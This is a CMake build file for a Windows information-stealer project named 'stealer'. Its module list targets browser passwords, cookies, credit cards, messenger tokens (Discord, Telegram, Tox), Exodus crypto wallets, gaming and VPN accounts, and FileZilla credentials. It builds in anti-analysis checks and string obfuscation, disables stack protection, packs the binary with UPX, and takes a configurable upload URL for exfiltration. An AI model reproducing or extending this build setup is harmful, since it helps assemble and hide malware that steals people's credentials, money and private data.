cmake_minimum_required(VERSION 3.28)
project(stealer)

set(CMAKE_SYSTEM_NAME Windows)
set(CMAKE_CXX_STANDARD 20)

if(CMAKE_BUILD_TYPE STREQUAL "Release")
    add_compile_options(
            /O1
            /GL
            /Oy
            /Gw
            /GS-
    )
    add_link_options(
            /LTCG
            /OPT:REF
            /OPT:ICF
            /COMPACT
    )
endif()

include_directories(include)
link_directories(include)

add_executable(stealer WIN32 src/main.cpp
        src/stealer/Stealer.cpp
        src/stealer/Stealer.h
        src/stealer/StealerModule.h
        src/Includes.h
        src/utils/Utils.cpp
        src/utils/Utils.h
        src/stealer/impl/Screenshot.cpp
        src/stealer/impl/Screenshot.h
        include/xorstr.hpp
        src/stealer/impl/messengers/Messengers.cpp
        src/stealer/impl/messengers/Messengers.h
        src/stealer/impl/messengers/impl/Discord.cpp
        src/stealer/impl/messengers/impl/Discord.h
        include/json.hpp
        src/utils/StringUtil.cpp
        src/utils/StringUtil.h
        src/utils/HttpUtil.cpp
        src/utils/HttpUtil.h
        src/stealer/impl/messengers/impl/Telegram.cpp
        src/stealer/impl/messengers/impl/Telegram.h
        src/stealer/impl/files/Files.cpp
        src/stealer/impl/files/Files.h
        src/stealer/impl/Info.cpp
        src/stealer/impl/Info.h
        src/utils/OSUtil.cpp
        src/utils/OSUtil.h
        src/stealer/impl/Processes.cpp
        src/stealer/impl/Processes.h
        src/stealer/impl/crypto/Crypto.cpp
        src/stealer/impl/crypto/Crypto.h
        src/stealer/impl/crypto/impl/Exodus.cpp
        src/stealer/impl/crypto/impl/Exodus.h
        src/stealer/impl/vpns/VPNs.cpp
        src/stealer/impl/vpns/VPNs.h
        src/stealer/impl/vpns/impl/OpenVPN.cpp
        src/stealer/impl/vpns/impl/OpenVPN.h
        src/stealer/impl/games/Games.cpp
        src/stealer/impl/games/Games.h
        src/stealer/impl/games/impl/Steam.cpp
        src/stealer/impl/games/impl/Steam.h
        src/utils/chromuim/ChromiumUtil.cpp
        src/utils/chromuim/ChromiumUtil.h
        src/utils/Base64Util.cpp
        src/utils/Base64Util.h
        include/sqlite3.c
        include/sqlite3.h
        src/stealer/impl/games/impl/BattleNet.cpp
        src/stealer/impl/games/impl/BattleNet.h
        src/stealer/impl/games/impl/UbisoftConnect.cpp
        src/stealer/impl/games/impl/UbisoftConnect.h
        src/stealer/StealerModuleGroup.h
        src/stealer/impl/InstalledApps.cpp
        src/stealer/impl/InstalledApps.h
        include/pugiconfig.hpp
        include/pugixml.cpp
        include/pugixml.hpp
        src/stealer/impl/FileZilla.cpp
        src/stealer/impl/FileZilla.h
        src/utils/FilesUtil.cpp
        src/utils/FilesUtil.h
        src/stealer/impl/browsers/chromium/ChromiumBrowsers.cpp
        src/stealer/impl/browsers/chromium/ChromiumBrowsers.h
        src/stealer/impl/browsers/chromium/impl/CHistory.cpp
        src/stealer/impl/browsers/chromium/impl/CHistory.h
        src/stealer/impl/browsers/BrowserModule.h
        src/stealer/impl/browsers/chromium/impl/CCreditCards.cpp
        src/stealer/impl/browsers/chromium/impl/CCreditCards.h
        src/stealer/impl/browsers/chromium/impl/CDownloads.cpp
        src/stealer/impl/browsers/chromium/impl/CDownloads.h
        src/stealer/impl/browsers/chromium/impl/CPasswords.cpp
        src/stealer/impl/browsers/chromium/impl/CPasswords.h
        src/stealer/impl/browsers/chromium/ChromiumBrowserModule.h
        src/stealer/impl/browsers/chromium/impl/CBookmarks.cpp
        src/stealer/impl/browsers/chromium/impl/CBookmarks.h
        src/stealer/impl/browsers/chromium/impl/CAutoFill.cpp
        src/stealer/impl/browsers/chromium/impl/CAutoFill.h
        src/stealer/impl/browsers/chromium/impl/CCookies.cpp
        src/stealer/impl/browsers/chromium/impl/CCookies.h
        include/binaryhandler.hpp
        src/entity/Cookie.h
        src/entity/Password.h
        src/entity/AutoFill.h
        src/entity/History.h
        src/entity/Download.h
        src/entity/CreditCard.h
        src/entity/SharedEntity.h
        src/stealer/impl/browsers/firefox/FirefoxBrowsers.cpp
        src/stealer/impl/browsers/firefox/FirefoxBrowsers.h
        src/stealer/impl/browsers/firefox/FirefoxBrowserModule.h
        src/stealer/impl/browsers/firefox/impl/FBookmarks.cpp
        src/stealer/impl/browsers/firefox/impl/FBookmarks.h
        src/entity/Entity.h
        src/entity/Bookmark.h
        src/utils/SQLiteUtil.cpp
        src/utils/SQLiteUtil.h
        src/stealer/impl/browsers/firefox/impl/FHistory.cpp
        src/stealer/impl/browsers/firefox/impl/FHistory.h
        src/stealer/impl/browsers/firefox/impl/FPasswords.cpp
        src/stealer/impl/browsers/firefox/impl/FPasswords.h
        src/stealer/impl/browsers/firefox/impl/FCookies.cpp
        src/stealer/impl/browsers/firefox/impl/FCookies.h
        src/stealer/impl/messengers/impl/Tox.cpp
        src/stealer/impl/messengers/impl/Tox.h
        src/antianalysis/AntiAnalysisChecker.cpp
        src/antianalysis/AntiAnalysisChecker.h
        src/stealer/impl/games/impl/Minecraft.h
        src/stealer/impl/games/impl/Minecraft.cpp
        src/entity/MinecraftAccount.h
        src/Counter.h
        src/Counter.cpp
        src/Config.h
        include/miniz.c
        include/miniz.h
        include/lodepng.cpp
        include/lodepng.h
)

target_link_libraries(stealer
        crypt32
        bcrypt
        wininet
        wbemuuid
)

if(CMAKE_BUILD_TYPE STREQUAL "Release")
    message(STATUS "Build secret is set to: ${BUILD_SECRET}")
    add_custom_command(
            TARGET stealer
            POST_BUILD
            COMMAND ${CMAKE_CURRENT_SOURCE_DIR}\\libraries\\upx.exe --best --lzma $<TARGET_FILE:stealer>
            COMMENT "Packing stealer with UPX"
    )

    if(BUILD_SECRET)
        add_definitions(-DBUILD_SECRET="${BUILD_SECRET}")
    endif()

    if(BUILD_UUID)
        add_definitions(-DBUILD_UUID="${BUILD_UUID}")
    endif()

    if(UPLOAD_URL)
        add_definitions(-DUPLOAD_URL="${UPLOAD_URL}")
    endif()
else()
    add_definitions(-DDEV)
endif()